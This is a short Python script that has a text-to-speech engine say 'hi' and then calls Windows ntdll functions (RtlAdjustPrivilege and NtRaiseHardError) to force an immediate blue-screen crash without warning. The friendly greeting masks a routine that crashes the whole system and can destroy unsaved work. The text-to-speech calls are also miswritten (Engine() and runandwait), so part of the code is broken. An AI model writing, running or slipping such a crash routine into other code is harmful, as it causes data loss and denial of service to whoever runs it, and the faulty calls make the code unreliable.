import pyttsx3 as tts
import time
import ctypes

Eng = tts.Engine()
Eng.say('hi')
Eng.runandwait()

def bluescreen():
    ctypes.windll.ntdll.RtlAdjustPrivilege(20, True, False, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xC0000006, 0, 0, None, 6, ctypes.byref(ctypes.c_ulong()))

bluescreen()
